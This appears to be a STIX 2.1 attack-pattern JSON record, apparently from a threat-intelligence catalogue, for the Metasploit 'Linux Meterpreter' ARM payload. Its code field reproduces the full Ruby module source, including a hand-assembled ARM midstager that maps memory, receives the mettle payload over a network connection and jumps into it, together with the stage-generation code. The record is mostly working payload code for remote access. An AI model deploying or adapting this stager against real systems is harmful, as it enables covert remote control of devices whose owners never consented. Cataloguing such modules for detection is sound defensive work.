{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a49fe020-bb17-4cc1-a535-c2a1eb0775f3",
    "created": "2024-08-14T16:33:19.267803Z",
    "modified": "2024-08-14T16:33:19.267807Z",
    "name": "Linux Meterpreter",
    "description": "Inject the mettle server payload (staged)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/linux/armle/meterpreter.rb",
            "external_id": "meterpreter.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/elfparsey'\n\nmodule MetasploitModule\n  include Msf::Sessions::MeterpreterOptions\n  include Msf::Sessions::MettleConfig\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'          => 'Linux Meterpreter',\n        'Description'   => 'Inject the mettle server payload (staged)',\n        'Author'        => [\n          'Adam Cammack <adam_cammack[at]rapid7.com>'\n        ],\n        'Platform'      => 'linux',\n        'Arch'          => ARCH_ARMLE,\n        'License'       => MSF_LICENSE,\n        'Session'       => Msf::Sessions::Meterpreter_armle_Linux\n      )\n    )\n  end\n\n  def elf_ep(payload)\n    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))\n    elf.elf_header.e_entry\n  end\n\n  def handle_intermediate_stage(conn, payload)\n    entry_offset = elf_ep(payload)\n\n    # Generated from external/source/shellcode/linux/armle/stage_mettle.s\n    midstager = [\n      0xe3a00000,         #  mov     r0, #0\n      0xe59f1070,         #  ldr     r1, [pc, #112]  ; 0x100d0\n      0xe3a02007,         #  mov     r2, #7\n      0xe3a03022,         #  mov     r3, #34 ; 0x22\n      0xe3a04000,         #  mov     r4, #0\n      0xe3a05000,         #  mov     r5, #0\n      0xe3a070c0,         #  mov     r7, #192        ; 0xc0\n      0xef000000,         #  svc     0x00000000\n      0xe1a02001,         #  mov     r2, r1\n      0xe1a01000,         #  mov     r1, r0\n      0xe1a0000c,         #  mov     r0, ip\n      0xe3a03c01,         #  mov     r3, #256        ; 0x100\n      0xe59f7048,         #  ldr     r7, [pc, #72]   ; 0x100d4\n      0xef000000,         #  svc     0x00000000\n      0xe3cdd00f,         #  bic     sp, sp, #15\n      0xe28dd028,         #  add     sp, sp, #40     ; 0x28\n      0xe3a0406d,         #  mov     r4, #109        ; 0x6d\n      0xe52d4004,         #  push    {r4}            ; (str r4, [sp, #-4]!)\n      0xe3a04002,         #  mov     r4, #2\n      0xe1a0500d,         #  mov     r5, sp\n      0xe1a0600c,         #  mov     r6, ip\n      0xe3a07000,         #  mov     r7, #0\n      0xe3a08000,         #  mov     r8, #0\n      0xe3a09007,         #  mov     r9, #7\n      0xe1a0a001,         #  mov     sl, r1\n      0xe3a0b000,         #  mov     fp, #0\n      0xe3a0c000,         #  mov     ip, #0\n      0xe92d1ff0,         #  push    {r4, r5, r6, r7, r8, r9, sl, fp, ip}\n      0xe59f000c,         #  ldr     r0, [pc, #12]   ; 0x100d8\n      0xe0800001,         #  add     r0, r0, r1\n      0xe12fff10,         #  bx      r0\n      payload.length,\n      0x00000123,         #  .word\n      entry_offset\n    ].pack('V*')\n\n    vprint_status(\"Transmitting intermediate stager...(#{midstager.length} bytes)\")\n    conn.put([midstager.length].pack('V'))\n    conn.put(midstager) == midstager.length\n  end\n\n  def generate_stage(opts = {})\n    config_opts = {scheme: 'tcp'}.merge(mettle_logging_config(opts))\n    MetasploitPayloads::Mettle.new('armv5l-linux-musleabi',\n      generate_config(opts.merge(config_opts))).to_binary :process_image\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}